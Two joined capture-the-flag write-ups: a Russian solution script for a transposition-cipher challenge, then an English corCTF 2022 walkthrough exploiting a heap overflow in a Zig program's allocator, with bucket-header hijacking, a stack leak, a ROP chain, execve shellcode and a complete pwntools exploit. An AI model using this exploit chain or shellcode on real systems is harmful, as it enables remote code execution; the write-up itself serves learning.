Имеется сервис, который шифрует текстовые файлы (обязательно ASCII внутри и
расширение .txt).

Позаливав в него несколько пробных файлов, становится понятно, что это разные
вариации шифра перестановки. При длине открытого текста меньше требуемой в
конец дописываются пробелы, а потом уже выполняется перестановка. Было 3
вариации шифра для разной длины открытого текста: 1) < 36; 2) < 1024; 3) <
10000 (хз, можно ли было залить больше 10к). Соответственно, на выходе всегда
получается закрытый текст длиной 36, 1024 или 10000 символов.

Хотя первую вариацию шифра можно было прочитать и глазами (там, фактически, из
правого нижнего угла заполнялась таблица 6х6 вверх и влево), с остальными было
несколько сложнее сделать подобное. Чтобы долго не думать над закономерностями
перестановки, я написал скрипты, которые по очереди закидывают на сервис
тексты с символами в разных позициях и ищут их в ответе, чтобы понять, куда их
перемещает шифр.

Вот пример скрипта для 3-ей вариации, с минимальными изменениями подойдет и
для других:

```  
import requests, re

ALPHABET = '1234567890qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM' #
fix here souldn't be bigger than 36/1024/10k for different parts

def make(n):  
   print('step', n)  
   s = " "*(len(ALPHABET)*n)  
   s+=ALPHABET  
   s = s.ljust(1025, ' ') # fix here should be bigger than 36/1024/10k for
different parts  
   return s  
def send(s):  
   r = requests.post('https://zigzag.student2020tasks.ctf.su/upload',
files={'file': ('qwe.txt', s)})  
   regexp = re.search('>([0-9a-zA-Z ]{10000})<', r.text) # fix here
36/1024/10k for different parts  
   return regexp.group(1)

ans = []  
def getTable():  
   global ans  
   step = 0  
   while step*len(ALPHABET)<10000: # fix here 36/1024/10k for different parts  
       s = make(step)  
       try:  
           s = send(s)  
       except:  
           print('fail', ans)  
           break  
       for i in ALPHABET:  
           ans.append(s.index(i))  
       step +=1  
getTable()

#ans=[.....]

enc = open('zigzag3_e2df5a7d69.txt.enc').read() # fix filename  
end = ''  
for i in ans:  
   end+= enc[i]  
print(end)  
```## Introduction

`zigzag` is a zig heap challenge I did during the [corCTF
2022](https://ctftime.org/event/1656) event. It was pretty exotic given we
have to pwn a heap like challenge written in [zig](https://ziglang.org/). It
is not using the C allocator but instead it uses the GeneralPurposeAllocator,
which makes the challenge even more interesting. Find the tasks
[here](https://github.com/ret2school/ctf/tree/master/2022/corCTF/pwn/zieg).

## TL; DR  
- Understanding zig `GeneralPurposeAllocator` internals  
- Hiijack the `BucketHeader` of a given bucket to get a write what were / read what where primitive.  
- Leak stack + ROP on the fileRead function (mprotect + shellcode)  
- PROFIT

## Source code analysis

The source code is procided:  
```rust  
// zig build-exe main.zig -O ReleaseSmall  
// built with zig version: 0.10.0-dev.2959+6f55b294f

const std = @import("std");  
const fmt = std.fmt;

const stdout = std.io.getStdOut().writer();  
const stdin = std.io.getStdIn();

const MAX_SIZE: usize = 0x500;  
const ERR: usize = 0xbaad0000;  
const NULL: usize = 0xdead0000;

var chunklist: [20][]u8 = undefined;

var gpa = std.heap.GeneralPurposeAllocator(.{}){};  
const allocator = gpa.allocator();

pub fn menu() !void {  
   try stdout.print("[1] Add\n", .{});  
   try stdout.print("[2] Delete\n", .{});  
   try stdout.print("[3] Show\n", .{});  
   try stdout.print("[4] Edit\n", .{});  
   try stdout.print("[5] Exit\n", .{});  
   try stdout.print("> ", .{});  
}

pub fn readNum() !usize {  
   var buf: [64]u8 = undefined;  
   var stripped: []const u8 = undefined;  
   var amnt: usize = undefined;  
   var num: usize = undefined;

   amnt = try stdin.read(&buf;;  
   stripped = std.mem.trimRight(u8, buf[0..amnt], "\n");

   num = fmt.parseUnsigned(usize, stripped, 10) catch {  
       return ERR;  
   };

   return num;  
}

pub fn add() !void {  
   var idx: usize = undefined;  
   var size: usize = undefined;

   try stdout.print("Index: ", .{});  
   idx = try readNum();

   if (idx == ERR or idx >= chunklist.len or @ptrToInt(chunklist[idx].ptr) !=
NULL) {  
       try stdout.print("Invalid index!\n", .{});  
       return;  
   }

   try stdout.print("Size: ", .{});  
   size = try readNum();

   if (size == ERR or size >= MAX_SIZE) {  
       try stdout.print("Invalid size!\n", .{});  
       return;  
   }

   chunklist[idx] = try allocator.alloc(u8, size);

   try stdout.print("Data: ", .{});  
   _ = try stdin.read(chunklist[idx]);  
}

pub fn delete() !void {  
   var idx: usize = undefined;

   try stdout.print("Index: ", .{});  
   idx = try readNum();

   if (idx == ERR or idx >= chunklist.len or @ptrToInt(chunklist[idx].ptr) ==
NULL) {  
       try stdout.print("Invalid index!\n", .{});  
       return;  
   }

   _ = allocator.free(chunklist[idx]);

   chunklist[idx].ptr = @intToPtr([*]u8, NULL);  
   chunklist[idx].len = 0;  
}

pub fn show() !void {  
   var idx: usize = undefined;

   try stdout.print("Index: ", .{});  
   idx = try readNum();

   if (idx == ERR or idx >= chunklist.len or @ptrToInt(chunklist[idx].ptr) ==
NULL) {  
       try stdout.print("Invalid index!\n", .{});  
       return;  
   }

   try stdout.print("{s}\n", .{chunklist[idx]});  
}

pub fn edit() !void {  
   var idx: usize = undefined;  
   var size: usize = undefined;

   try stdout.print("Index: ", .{});  
   idx = try readNum();

   if (idx == ERR or idx >= chunklist.len or @ptrToInt(chunklist[idx].ptr) ==
NULL) {  
       try stdout.print("Invalid index!\n", .{});  
       return;  
   }

   try stdout.print("Size: ", .{});  
   size = try readNum();

   if (size > chunklist[idx].len and size == ERR) {  
       try stdout.print("Invalid size!\n", .{});  
       return;  
   }

   chunklist[idx].len = size;

   try stdout.print("Data: ", .{});  
   _ = try stdin.read(chunklist[idx]);  
}

pub fn main() !void {  
   var choice: usize = undefined;

   for (chunklist) |_, i| {  
       chunklist[i].ptr = @intToPtr([*]u8, NULL);  
       chunklist[i].len = 0;  
   }

   while (true) {  
       try menu();

       choice = try readNum();  
       if (choice == ERR) continue;

       if (choice == 1) try add();  
       if (choice == 2) try delete();  
       if (choice == 3) try show();  
       if (choice == 4) try edit();  
       if (choice == 5) break;  
   }  
}  
```

The source code is quite readable, the vulnerability is the overflow within
the `edit` function. The check onto the provided size isn't efficient, `size >
chunklist[idx].len and size == ERR`, if `size > chunklist[idx].len` and if
`size != ERR` the condition is false. Which means we can edit the chunk by
writing an arbitrary amount of data in it.

## GeneralPurposeAllocator abstract

The [zig](https://github.com/ziglang/zig/) source is quite readable so let's
take a look at the internals of the GeneralPurposeAllocator allocator.  
The GeneralPurposeAllocator is implemented
[here](https://github.com/ziglang/zig/blob/master/lib/std/heap/general_purpose_allocator.zig).  
The header of the source code file gives the basic design of the allocator:  
```  
//! ## Basic Design:  
//!  
//! Small allocations are divided into buckets:  
//!  
//! ```  
//! index obj_size  
//! 0     1  
//! 1     2  
//! 2     4  
//! 3     8  
//! 4     16  
//! 5     32  
//! 6     64  
//! 7     128  
//! 8     256  
//! 9     512  
//! 10    1024  
//! 11    2048  
//! ```  
//!  
//! The main allocator state has an array of all the "current" buckets for
each  
//! size class. Each slot in the array can be null, meaning the bucket for
that  
//! size class is not allocated. When the first object is allocated for a
given  
//! size class, it allocates 1 page of memory from the OS. This page is  
//! divided into "slots" - one per allocated object. Along with the page of
memory  
//! for object slots, as many pages as necessary are allocated to store the  
//! BucketHeader, followed by "used bits", and two stack traces for each slot  
//! (allocation trace and free trace).  
//!  
//! The "used bits" are 1 bit per slot representing whether the slot is used.  
//! Allocations use the data to iterate to find a free slot. Frees assert that
the  
//! corresponding bit is 1 and set it to 0.  
//!  
//! Buckets have prev and next pointers. When there is only one bucket for a
given  
//! size class, both prev and next point to itself. When all slots of a bucket
are  
//! used, a new bucket is allocated, and enters the doubly linked list. The
main  
//! allocator state tracks the "current" bucket for each size class. Leak
detection  
//! currently only checks the current bucket.  
//!  
//! Resizing detects if the size class is unchanged or smaller, in which case
the same  
//! pointer is returned unmodified. If a larger size class is required,  
//! `error.OutOfMemory` is returned.  
//!  
//! Large objects are allocated directly using the backing allocator and their
metadata is stored  
//! in a `std.HashMap` using the backing allocator.  
```

Let's take a look at `alloc` function:  
```rust  
fn alloc(self: *Self, len: usize, ptr_align: u29, len_align: u29, ret_addr:
usize) Error![]u8 {  
   self.mutex.lock();  
   defer self.mutex.unlock();

   if (!self.isAllocationAllowed(len)) {  
       return error.OutOfMemory;  
   }

   const new_aligned_size = math.max(len, ptr_align);  
   if (new_aligned_size > largest_bucket_object_size) {  
       try self.large_allocations.ensureUnusedCapacity(self.backing_allocator, 1);  
       const slice = try self.backing_allocator.rawAlloc(len, ptr_align, len_align, ret_addr);

       const gop = self.large_allocations.getOrPutAssumeCapacity(@ptrToInt(slice.ptr));  
       if (config.retain_metadata and !config.never_unmap) {  
           // Backing allocator may be reusing memory that we're retaining metadata for  
           assert(!gop.found_existing or gop.value_ptr.freed);  
       } else {  
           assert(!gop.found_existing); // This would mean the kernel double-mapped pages.  
       }  
       gop.value_ptr.bytes = slice;  
       if (config.enable_memory_limit)  
           gop.value_ptr.requested_size = len;  
       gop.value_ptr.captureStackTrace(ret_addr, .alloc);  
       if (config.retain_metadata) {  
           gop.value_ptr.freed = false;  
           if (config.never_unmap) {  
               gop.value_ptr.ptr_align = ptr_align;  
           }  
       }

       if (config.verbose_log) {  
log.info("large alloc {d} bytes at {*}", .{ slice.len, slice.ptr });  
       }  
       return slice;  
   }

   const new_size_class = math.ceilPowerOfTwoAssert(usize, new_aligned_size);  
   const ptr = try self.allocSlot(new_size_class, ret_addr);  
   if (config.verbose_log) {  
log.info("small alloc {d} bytes at {*}", .{ len, ptr });  
   }  
   return ptr[0..len];  
}  
```  
First in `alloc`, if the aligned size is not larger than the largest bucket
capacity (2**11) it will call `allocSlot`.

```rust  
fn allocSlot(self: *Self, size_class: usize, trace_addr: usize) Error![*]u8 {  
   const bucket_index = math.log2(size_class);  
   const first_bucket = self.buckets[bucket_index] orelse try
self.createBucket(  
       size_class,  
       bucket_index,  
   );  
   var bucket = first_bucket;  
   const slot_count = @divExact(page_size, size_class);  
   while (bucket.alloc_cursor == slot_count) {  
       const prev_bucket = bucket;  
       bucket = prev_bucket.next;  
       if (bucket == first_bucket) {  
           // make a new one  
           bucket = try self.createBucket(size_class, bucket_index);  
           bucket.prev = prev_bucket;  
           bucket.next = prev_bucket.next;  
           prev_bucket.next = bucket;  
           bucket.next.prev = bucket;  
       }  
   }  
   // change the allocator's current bucket to be this one  
   self.buckets[bucket_index] = bucket;

   const slot_index = bucket.alloc_cursor;  
   bucket.alloc_cursor += 1;

   var used_bits_byte = bucket.usedBits(slot_index / 8);  
   const used_bit_index: u3 = @intCast(u3, slot_index % 8); // TODO cast
should be unnecessary  
   used_bits_byte.* |= (@as(u8, 1) << used_bit_index);  
   bucket.used_count += 1;  
   bucket.captureStackTrace(trace_addr, size_class, slot_index, .alloc);  
   return bucket.page + slot_index * size_class;  
}  
```  
`allocSlot` will check if the current bucket is able to allocate one more
object, else it will iterate through the doubly linked list to look for a not
full bucket.  
And if it does nto find one, it creates a new bucket. When the bucket is
allocated, it returns the available objet at `bucket.page + slot_index *
size_class`.

As you can see, the `BucketHeader` is structured like below in the
`createBucket` function:

```rust  
fn createBucket(self: *Self, size_class: usize, bucket_index: usize)
Error!*BucketHeader {  
   const page = try self.backing_allocator.allocAdvanced(u8, page_size,
page_size, .exact);  
   errdefer self.backing_allocator.free(page);

   const bucket_size = bucketSize(size_class);  
   const bucket_bytes = try self.backing_allocator.allocAdvanced(u8,
@alignOf(BucketHeader), bucket_size, .exact);  
   const ptr = @ptrCast(*BucketHeader, bucket_bytes.ptr);  
   ptr.* = BucketHeader{  
       .prev = ptr,  
       .next = ptr,  
       .page = page.ptr,  
       .alloc_cursor = 0,  
       .used_count = 0,  
   };  
   self.buckets[bucket_index] = ptr;  
   // Set the used bits to all zeroes  
   @memset(@as(*[1]u8, ptr.usedBits(0)), 0, usedBitsCount(size_class));  
   return ptr;  
}  
```

It allocates a page to store objects in, then it allocates the `BucketHeader`
itself. Note that the page allocator will make allocations adjacent from each
other. According to my several experiments the allocations grow -- from an
initial given mapping -- to lower or higher addresses. I advice you to try
different order of allocations in gdb to figure out this.

Let's quickly decribe each field of the `BucketHeader`:  
- `.prev` and `.next` keep track of the doubly linked list that links buckets of same size.  
- `.page` contains the base address of the page that contains the objects that belong to the bucket.  
- `alloc_cursor` contains the number of allocated objects.  
- `used_count` contains the number of currently used objects.

## Getting read / write what were primitive

Well, the goal is to an arbitrary read / write by hiijacking the `.page` and
`.alloc_cursor` fields of the `BucketHeader`, this way if we hiijack pointers
from a currently used bucket for a given size we can get a chunk toward any
location.

What we can do to get a chunk close to a  `BucketHeader` structure would be:  
- Allocate large (`0x500-1`) chunk, `0x800` bucket.  
- Allocate 4 other chunks of size `1000`, which end up in the `0x400` bucket.

Thus, first one page has been allocated to satisfy request one, then another
page right after the other has been allocated to store the `BucketHeader` for
this bucket.  
Then, to satisfy the four next allocations, the page that stores the objects
has been allocated right after the one which stores the `BucketHeader` of the
`0x800`-bucket, and finally a page is allocated to store the `BucketHeader` of
the `0x400` bucket.

If you do not understand clearly, I advice you to debug my exploit in `gdb` by
looking at the `chunklist`.

With this process the last allocated `0x400`-sized chunk gets allocated
`0x400` bytes before the `BucketHeader` of the bucket that handles
`0x400`-sized chunks.  
Thus to get a read / write what were we can simply trigger the heap overflow
with the `edit` function to null out `.alloc_cursor` and `.used_count` and
replace `.page` by the target location.  
This way the next allocation that will request `0x400` bytes, which will
trigger the hiijacked bucket and return the target location giving us the
primitive.

Which gives:  
```py  
alloc(0, 0x500-1, b"A")  
for i in range(1, 5):  
   alloc(i, 1000, b"vv")

edit(4, 0x400 + 5*8, b"X"*0x400 \ # padding  
    + pwn.p64(0x208000)*3 \ # next / prev + .page point toward the target => 0x208000  
    + pwn.p64(0x0) \ # .alloc_cursor & .used_count  
    + pwn.p64(0)) # used bits

# next alloc(1000) will trigger the write what were  
```

## Leak stack

To leak the stack I leaked the `argv` variable that contains a pointer toward
arguments given to the program, stored on the stack. That's a reliable leak
given it's a known and fixed location, which can base used as a base compared
with function's stackframes.

```py  
alloc(5, 1000, b"A") # get chunk into target location (0x208000)  
show(5)  
io.recv(0x100) # argv is located at 0x208000 + 0x100

stack = pwn.u64(io.recv(8))  
pwn.log.info(f"stack: {hex(stack)}")  
```

## ROP

Now we're able to overwrite whatever function's stackframe, we have to find
one that returns from context of `std.fs.file.File.read` that reads the user
input to the chunk. But unlucky functions like `add`, `edit` are inlined in
the `main` function. Moreover we cannot overwrite the return address of the
`main` function given that the exit handler call directly exit. Which means we
have to corrput the stackframe of the `std.fs.file.File.read` function called
in the `edit` function.  
But the issue is that between the call to `SYS_read` within
`std.fs.file.File.read` and the end of the function, variables that belong to
the calling function's stackframe are edited, corrupting the ROPchain. So what
I did is using this gadget to reach a part of the stack that will not be
corrupted:

```  
0x0000000000203715 : add rsp, 0x68 ; pop rbx ; pop r14 ; ret  
```

With the use of this gadget I'm able to pop a few QWORD from the stack to
reach another area of the stack where I write my ROPchain.  
The goal for the ROPchain is to `mptotect` a shellcode and then jump on it.
The issue is that I didn't find a gadget to control the value of the `rdx`
register but when it returns from `std.fs.file.File.read` it contains the
value of size given to `edit`. So to call `mprotect(rdi=0x208000, rsi=0x1000,
rdx=0x7)` we have to call `edit` with a size of `7` to write on the
`std.fs.file.File.read` saved RIP the value of the magic gadget seen
previously.

Here is the ROPchain:  
```py  
edit(4, 0x400 + 5*8, b"A"*0x400 + pwn.p64(0x208000)*3 + pwn.p64(0x000) +
pwn.p64(0))  
# with the use of the write what were we write the shellcode at 0x208000

shellcode =
b"\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05"  
# execve("/bin/sh", NULL, NULL)

alloc(14, 1000, shellcode)

"""  
0x0000000000201fcf : pop rax ; syscall  
0x0000000000203147 : pop rdi ; ret  
0x000000000020351b : pop rsi ; ret  
0x00000000002035cf : xor edx, edx ; mov rsi, qword ptr [r9] ; xor eax, eax ;
syscall  
0x0000000000201e09 : ret  
0x0000000000203715 : add rsp, 0x68 ; pop rbx ; pop r14 ; ret  
"""

edit(4, 0x400 + 5*8, b"A"*0x400 + pwn.p64(stack-0x50)* 3 + pwn.p64(0) +
pwn.p64(0))  
# write ROPchain into the safe area on the stack  
alloc(11, 0x400, pwn.p64(0x203147) \ # pop rdi ; ret  
       + pwn.p64(0x208000) + \ # target area for the shellcode  
       pwn.p64(0x20351b) + \ # pop rsi ; ret  
       pwn.p64(0x1000) + \ # length  
       pwn.p64(0x201fcf) + \ # pop rax ; syscall  
       pwn.p64(0xa) + \ # SYS_mprotect  
       pwn.p64(0x208000)) # jump on the shellcode + PROFIT

edit(4, 0x400 + 5*8, b"A"*0x400 + pwn.p64(stack-0xd0)* 3 + pwn.p64(0) +
pwn.p64(0))

alloc(12, 1000, pwn.p64(0x202d16)) # valid return address  
edit(12, 0x7, pwn.p64(0x0000000000203715)) # magic gadget

io.interactive()  
```

## PROFIT

```  
nasm@off:~/Documents/pwn/corCTF/zieg$ python3 remote.py REMOTE HOST=be.ax
PORT=31278  
[*] '/home/nasm/Documents/pwn/corCTF/zieg/zigzag'  
   Arch:     amd64-64-little  
   RELRO:    No RELRO  
   Stack:    No canary found  
   NX:       NX enabled  
   PIE:      No PIE (0x200000)  
[+] Opening connection to be.ax on port 31278: Done  
[*] stack: 0x7ffc2ca48ae8  
[*] Loaded 37 cached gadgets for 'zigzag'  
[*] Using sigreturn for 'SYS_execve'  
[*] Switching to interactive mode  
$ id  
uid=1000(ctf) gid=1000(ctf) groups=1000(ctf)  
$ ls  
flag.txt  
zigzag  
$ cat flag.txt  
corctf{bl4Z1nGlY_f4sT!!}  
```

## Appendices

Final exploit:  
```py  
#!/usr/bin/env python  
# -*- coding: utf-8 -*-

# this exploit was generated via  
# 1) pwntools  
# 2) ctfmate

import os  
import time  
import pwn

# Set up pwntools for the correct architecture  
exe = pwn.context.binary = pwn.ELF('zigzag')  
# pwn.context.terminal = ['tmux', 'new-window']  
pwn.context.delete_corefiles = True  
pwn.context.rename_corefiles = False

host = pwn.args.HOST or '127.0.0.1'  
port = int(pwn.args.PORT or 1337)

def local(argv=[], *a, **kw):  
   '''Execute the target binary locally'''  
   if pwn.args.GDB:  
       return pwn.gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)  
   else:  
       return pwn.process([exe.path] + argv, *a, **kw)

def remote(argv=[], *a, **kw):  
   '''Connect to the process on the remote host'''  
   io = pwn.connect(host, port)  
   if pwn.args.GDB:  
       pwn.gdb.attach(io, gdbscript=gdbscript)  
   return io

def start(argv=[], *a, **kw):  
   '''Start the exploit against the target.'''  
   if pwn.args.LOCAL:  
       return local(argv, *a, **kw)  
   else:  
       return remote(argv, *a, **kw)

gdbscript = '''  
source ~/Downloads/pwndbg/gdbinit.py  
'''.format(**locals())

io = None

io = start()

def alloc(idx, size, data):  
   io.sendlineafter(b"> ", b"1")  
   io.sendlineafter(b"Index: ", str(idx).encode())  
   io.sendlineafter(b"Size: ", str(size).encode())  
   io.sendlineafter(b"Data: ", data)

def delete(idx):  
   io.sendlineafter(b"> ", b"2")  
   io.sendlineafter(b"Index: ", str(idx).encode())

def show(idx):  
   io.sendlineafter(b"> ", b"3")  
   io.sendlineafter(b"Index: ", str(idx).encode())

def edit(idx, size, data):  
   io.sendlineafter(b"> ", b"4")  
   io.sendlineafter(b"Index: ", str(idx).encode())  
   io.sendlineafter(b"Size: ", str(size).encode())  
   io.sendlineafter(b"Data: ", data)

alloc(0, 0x500-1, b"A")  
for i in range(1, 5):  
   alloc(i, 1000, b"vv")

edit(4, 0x400 + 5*8, b"X"*0x400 + pwn.p64(0x208000)*3 + pwn.p64(0x000) +
pwn.p64(0))

alloc(5, 1000, b"A")  
show(5)  
io.recv(0x100)

stack = pwn.u64(io.recv(8))  
pwn.log.info(f"stack: {hex(stack)}")

edit(4, 0x400 + 5*8, b"A"*0x400 + pwn.p64(0x208000)*3 + pwn.p64(0x000) +
pwn.p64(0))

shellcode =
b"\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05"

alloc(14, 1000, shellcode)

"""  
0x0000000000201fcf : pop rax ; syscall  
0x0000000000203147 : pop rdi ; ret  
0x000000000020351b : pop rsi ; ret  
0x00000000002035cf : xor edx, edx ; mov rsi, qword ptr [r9] ; xor eax, eax ;
syscall  
0x0000000000201e09 : ret  
0x0000000000203715 : add rsp, 0x68 ; pop rbx ; pop r14 ; ret  
"""

rop = pwn.ROP(exe)  
binsh = 0x208000+(48)  
rop.execve(binsh, 0, 0)

edit(4, 0x400 + 5*8, b"A"*0x400 + pwn.p64(stack-0x50)* 3 + pwn.p64(0) +
pwn.p64(0))  
alloc(11, 0x400, pwn.p64(0x203147) + pwn.p64(0x208000) + pwn.p64(0x20351b) +
pwn.p64(0x1000) + pwn.p64(0x201fcf) + pwn.p64(0xa) + pwn.p64(0x208000))

edit(4, 0x400 + 5*8, b"A"*0x400 + pwn.p64(stack-0xd0)* 3 + pwn.p64(0) +
pwn.p64(0))

alloc(12, 1000,pwn.p64(0x202d16))  
edit(12, 0x7, pwn.p64(0x0000000000203715))

io.interactive()

"""  
nasm@off:~/Documents/pwn/corCTF/zieg$ python3 remote.py REMOTE HOST=be.ax
PORT=31278  
[*] '/home/nasm/Documents/pwn/corCTF/zieg/zigzag'  
   Arch:     amd64-64-little  
   RELRO:    No RELRO  
   Stack:    No canary found  
   NX:       NX enabled  
   PIE:      No PIE (0x200000)  
[+] Opening connection to be.ax on port 31278: Done  
[*] stack: 0x7ffe21d2cc68  
[*] Loaded 37 cached gadgets for 'zigzag'  
[*] Using sigreturn for 'SYS_execve'  
[*] Switching to interactive mode  
$ id  
uid=1000(ctf) gid=1000(ctf) groups=1000(ctf)  
$ cat flag.txt  
corctf{bl4Z1nGlY_f4sT!!}  
"""  
```

Original writeup (https://ret2school.github.io/post/zigzag/).